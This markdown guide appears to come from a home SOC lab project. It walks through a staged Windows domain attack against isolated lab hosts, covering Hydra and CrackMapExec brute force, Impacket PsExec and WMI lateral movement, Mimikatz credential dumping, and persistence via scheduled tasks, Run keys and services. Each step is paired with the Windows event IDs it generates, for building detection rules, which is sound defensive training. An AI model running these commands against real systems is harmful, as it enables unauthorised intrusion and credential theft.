# 03 – Attack Simulations

Run these **only in your isolated lab**. Order matters: initial access → lateral movement → privilege escalation → persistence.

---

## Phase 1: Brute Force

**Goal:** Gain initial access via password attacks against SMB, RDP, or WinRM.

### 1.1 SMB brute force (CrackMapExec / Hydra)

From Kali, target the victim (or DC with a weak account):

```bash
# CrackMapExec – password spray (one password, many users)
crackmapexec smb 192.168.100.20 -u users.txt -p 'Password1!' --local-auth

# Or full brute (user list + password list) – use small lists in lab
hydra -L users.txt -P passwords.txt 192.168.100.20 smb -t 4
```

- **Expected logs:** Windows Security 4625 (failed logon), then 4624 (success).  
- **IOC:** Many 4625 from same source IP in short time; event 4625 with logon type 3 (network).

### 1.2 RDP brute force

```bash
hydra -L users.txt -P passwords.txt 192.168.100.20 rdp -t 4
```

- **Expected logs:** 4625 (logon type 10 = RDP); 4624 on success.

### 1.3 WinRM brute force

```bash
crackmapexec winrm 192.168.100.0/24 -u users.txt -p passwords.txt
```

- **Expected logs:** 4625 (logon type 10 or 3); 4624 on success.

**Document:** Source IP (Kali), target IP, user names tried, time window, and first successful 4624.

---

## Phase 2: Lateral Movement

**Goal:** Use the compromised account to execute commands on another host (e.g. Win10 → DC or Win10 → Win10).

### 2.1 PsExec (Impacket)

Assume you have `labuser:Password1!` on 192.168.100.20 and want to run a command on 192.168.100.21 or DC:

```bash
# From Kali with Impacket
psexec.py LAB.local/labuser:'Password1!'@192.168.100.21 -c cmd.exe
# Or run a single command
psexec.py LAB.local/labuser:'Password1!'@192.168.100.10 "whoami /all"
```

- **Expected logs:** 4624 (logon type 3), 4688 (process creation – `PsExec`, `cmd`, or `psexec`), 7045 (service install if classic PsExec).

### 2.2 WMI (wmiexec)

```bash
wmiexec.py LAB.local/labuser:'Password1!'@192.168.100.21
```

- **Expected logs:** 4624, 4688 (e.g. `WmiPrvSE.exe` spawning child processes).

### 2.3 RDP session

After brute force, use RDP to log in interactively:

```bash
xfreerdp /u:labuser /p:Password1! /v:192.168.100.21
```

- **Expected logs:** 4624 logon type 10, 4634/4647 on logoff.

**Document:** Source host, destination host, method (PsExec/WMI/RDP), and new 4688/4624 events.

---

## Phase 3: Privilege Escalation

**Goal:** Elevate from standard user to local admin or domain admin.

### 3.1 Dump credentials (Mimikatz – lab only)

On a host where you have local admin (or after lateral movement with admin):

- Run Mimikatz: `sekurlsa::logonpasswords`, `lsadump::sam`, etc.  
- **Expected logs:** 4688 (mimikatz or lsass access), 10 (process access to LSASS). Sysmon 10 (process access) if Sysmon is installed.

### 3.2 Abuse misconfigurations

- **Unconstrained delegation, Kerberoasting, DCSync:** Use Impacket or BloodHound in lab to find and abuse.  
- **Document:** Which account/host was used, which technique, and resulting 4672/4688/4648 events.

### 3.3 Local privilege escalation

- Scheduled task or service running as SYSTEM, writable path, or vulnerable driver (use only known lab-safe exploits).  
- **Expected logs:** 4688 (high-privilege process), 4698 (scheduled task), 7045 (service).

**Document:** Before/after privileges (e.g. `labuser` → `SYSTEM` or `Domain Admin`), technique, and host.

---

## Phase 4: Persistence

**Goal:** Ensure access survives reboot.

### 4.1 Scheduled task

On victim (with admin):

```bash
# From Kali (via psexec or existing shell)
schtasks /create /tn "Updater" /tr "c:\windows\temp\payload.exe" /sc onlogon /ru SYSTEM /s 192.168.100.20 /u LAB\labuser /p Password1!
```

Or create locally on compromised host:

```powershell
schtasks /create /tn "Updater" /tr "cmd /c calc" /sc onlogon /ru SYSTEM
```

- **Expected logs:** 4698 (scheduled task created), 4688 (task execution at logon).

### 4.2 Registry Run key

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "c:\windows\temp\payload.exe" /f
```

- **Expected logs:** Sysmon 13 (registry value set) or Windows 4657/4663 if auditing registry.

### 4.3 New service

```powershell
sc create "BackupSvc" binPath= "c:\windows\temp\payload.exe" start= auto
sc start BackupSvc
```

- **Expected logs:** 7045 (service installed), 4688 (service host process).

**Document:** Persistence type, path/command, and host. Use this to build IOCs and detection rules.

---

## Simulation Checklist

| Phase | Technique | Source IP | Target IP | Account | Time (approx) |
|-------|-----------|-----------|-----------|---------|----------------|
| 1 | SMB/RDP/WinRM brute | .100.50 | .100.20 | labuser | _____ |
| 2 | PsExec/WMI/RDP | .100.50 / .100.20 | .100.21 / .100.10 | labuser | _____ |
| 3 | Credential dump / abuse | .100.20 or .100.21 | - | → admin | _____ |
| 4 | Scheduled task / registry / service | .100.50 | .100.20 | labuser/admin | _____ |

Use this table and the timestamps from your SIEM to correlate events and write **04-indicators-of-compromise.md** and **05-detection-rules**.
